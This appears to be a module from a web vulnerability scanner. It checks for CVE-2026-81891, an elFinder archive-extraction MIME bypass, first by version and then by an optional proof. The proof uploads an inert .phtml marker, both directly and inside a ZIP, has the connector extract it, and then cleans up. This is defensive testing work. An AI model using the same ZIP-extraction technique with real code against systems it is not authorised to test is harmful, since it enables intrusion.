from __future__ import annotations

import secrets
from typing import Any

from ...core.models import Confidence, Finding, Status
from ...core.versions import parse_version_safe
from .elfinder import cleanup, command, discover, endpoint_url, first_added, read_file, upload, zip_payload

CVE_ID = "CVE-2026-81891"
RULE = "elFinder before 2.1.70"


def classify_version(version: str | None) -> str:
    value = parse_version_safe(version)
    if value is None:
        return Status.DETECTED_VERSION_UNKNOWN
    return Status.LIKELY_VULNERABLE if value < parse_version_safe("2.1.70") else Status.PATCHED


def check(target_url: str, cms_version: str | None = None, run_exploit_check: bool = False,
          timeout: int = 12, proxy: str | None = None, **kwargs: Any) -> Finding:
    conn = discover(target_url, timeout, proxy)
    if not conn:
        return Finding(CVE_ID, "elFinder archive extraction MIME bypass", Status.NOT_DETECTED, Confidence.MEDIUM,
                       "Web library elFinder", affected_rule=RULE, exploit_available=True,
                       detail="No public elFinder connector was detected at standard paths.",
                       action="Verify manually if elFinder uses a custom connector path.")
    status = classify_version(conn.get("version"))
    result = Finding(CVE_ID, "elFinder archive extraction MIME bypass", status,
                     Confidence.HIGH if conn.get("version") else Confidence.MEDIUM, "Web library elFinder",
                     conn.get("version"), RULE, True, detail="A public elFinder connector was detected.",
                     action="Upgrade elFinder to 2.1.70 or newer and restrict connector access.",
                     proof_url=endpoint_url(target_url, conn))
    if not run_exploit_check or status == Status.PATCHED:
        return result
    nonce = secrets.token_hex(5)
    inner_name, zip_name = f"proofcms_{nonce}.phtml", f"proofcms_{nonce}.zip"
    marker = f"PROOFCMS_SAFE_{secrets.token_hex(8)}"
    direct = first_added(upload(conn, inner_name, marker.encode(), "text/plain"), inner_name)
    cleanup_hashes = [direct["hash"]] if direct else []
    result.exploit_ran = True
    if direct:
        cleanup(conn, cleanup_hashes)
        result.status, result.confidence = Status.NOT_CONFIRMED, Confidence.MEDIUM
        result.detail = "The direct inert .phtml control upload was accepted, so the archive-only MIME validation bypass could not be isolated."
        return result
    uploaded_zip = first_added(upload(conn, zip_name, zip_payload(inner_name, marker.encode()), "application/zip"), zip_name)
    if not uploaded_zip:
        result.status, result.confidence = Status.NOT_CONFIRMED, Confidence.MEDIUM
        result.detail = "The direct control was rejected, but the connector did not accept the inert ZIP proof."
        return result
    cleanup_hashes.append(uploaded_zip["hash"])
    extracted = command(conn, {"cmd": "extract", "target": uploaded_zip["hash"], "makedir": "0"})
    extracted_file = first_added(extracted, inner_name)
    if extracted_file:
        cleanup_hashes.insert(0, extracted_file["hash"])
    confirmed = bool(extracted_file and marker in read_file(conn, extracted_file["hash"]))
    cleanup(conn, cleanup_hashes)
    if confirmed:
        result.status, result.confidence = Status.VULNERABLE_UPLOAD_ONLY, Confidence.CONFIRMED
        result.detail = "The connector rejected a direct inert .phtml upload but accepted the same text-only file through ZIP extraction. No PHP code was uploaded or executed."
    else:
        result.status, result.confidence = Status.NOT_CONFIRMED, Confidence.MEDIUM
        result.detail = "The direct control was rejected, but ZIP extraction did not expose the inert .phtml marker."
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "generic", "name": "elFinder archive extraction MIME bypass",
            "component": "Web library elFinder", "affected_rule": RULE, "affected_versions": ["<2.1.70"],
            "exploit_available": True, "exploit_modes": ["safe"], "intrusive": False,
            "references": ["https://github.com/Studio-42/elFinder/compare/2.1.69...2.1.70", "https://www.cve.org/CVERecord?id=CVE-2026-81891"]}
